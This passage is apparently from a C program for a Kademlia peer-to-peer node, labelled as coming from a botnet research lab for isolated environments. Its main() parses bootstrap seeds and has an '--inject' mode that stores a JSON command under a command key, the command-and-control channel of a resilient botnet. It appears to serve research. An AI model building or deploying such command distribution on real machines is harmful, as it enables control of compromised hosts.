    printf("[DEMO] P2P resilience demonstrated.\n\n");

    for (int i = 0; i < N_NODES; i++) nodes[i].running = 0;
    sleep(1);
}

/* ── main ────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    seed_random();
    signal(SIGINT, sigint_handler);

    char host[64]      = "127.0.0.1";
    int  port          = 7400;
    int  demo_mode     = 0;
    int  inject_mode   = 0;
    char inject_json[MAX_VALUE_LEN] = {0};

    /* Bootstrap seeds — support up to MAX_SEEDS */
    char     seed_hosts[MAX_SEEDS][64];
    uint16_t seed_ports[MAX_SEEDS];
    int      n_seeds = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--host") == 0 && i+1 < argc)
            strncpy(host, argv[++i], 63);
        else if (strcmp(argv[i], "--port") == 0 && i+1 < argc)
            port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--bootstrap") == 0 && i+1 < argc &&
                 n_seeds < MAX_SEEDS) {
            char *arg = argv[++i];
            char *colon = strrchr(arg, ':');
            if (colon && n_seeds < MAX_SEEDS) {
                size_t hlen = (size_t)(colon - arg);
                if (hlen > 63) hlen = 63;
                strncpy(seed_hosts[n_seeds], arg, hlen);
                seed_hosts[n_seeds][hlen] = '\0';
                seed_ports[n_seeds] = htons((uint16_t)atoi(colon + 1));
                n_seeds++;
            }
        }
        else if (strcmp(argv[i], "--inject") == 0 && i+1 < argc) {
            strncpy(inject_json, argv[++i], MAX_VALUE_LEN - 1);
            inject_mode = 1;
        }
        else if (strcmp(argv[i], "--demo") == 0) demo_mode = 1;
        else if (strcmp(argv[i], "--help") == 0) {
            printf("Usage: %s [--host H] [--port P] "
                   "[--bootstrap H:P] [--inject JSON] [--demo]\n", argv[0]);
            return 0;
        }
    }

    printf("==============================================\n");
    printf(" Kademlia P2P Node — AUA Botnet Research Lab\n");
    printf(" ISOLATED ENVIRONMENT ONLY\n");
    printf("==============================================\n\n");

    if (demo_mode) { run_demo(); return 0; }

    static KademliaNode node;
    g_node = &node;
    uint16_t port_nbo = htons((uint16_t)port);
    if (node_init(&node, host, port_nbo) < 0) return 1;
    node_start_threads(&node);
    sleep(1);   /* let recv thread start */

    /* Bootstrap from all provided seeds */
    for (int i = 0; i < n_seeds; i++)
        bootstrap_from(&node, seed_hosts[i], seed_ports[i]);

    if (inject_mode) {
        sleep(2);
        uint8_t cmd_key[ID_BYTES]; sha1_str(COMMAND_KEY, cmd_key);
        int acks = store_value(&node, cmd_key, inject_json, strlen(inject_json));
        printf("[P2P] Command injected: %s | acks: %d\n", inject_json, acks);
        sleep(1);
        node_stop(&node);
        return 0;
    }

    printf("[P2P] Running. Ctrl+C to stop.\n\n");
    while (node.running) sleep(1);
    return 0;
}